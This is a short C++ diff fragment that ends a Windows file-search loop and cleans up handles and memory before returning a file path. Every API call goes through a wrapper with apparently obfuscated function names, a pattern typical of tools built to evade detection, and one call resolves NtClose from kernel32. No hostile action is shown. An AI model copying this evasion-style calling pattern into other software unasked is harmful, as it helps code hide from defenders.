+            } while( VkCall<BOOL>( XprKernel32, XPR( "FindNextFileA" ), FindHandle, &FindData ) );
+
+        _VK_END:
+            if ( FindHandle ) VkCall<BOOL>( XprKernel32, XPR( "FindClose" ), FindHandle );
+            if ( FileHandle ) VkCall<BOOL>( XprKernel32, XPR( "NtClose" ), FileHandle );
+            if ( FileBuffer ) VkMem::Heap::Free( FileBuffer, FileSize );
+            return FilePath;
         }
     }
+
 }
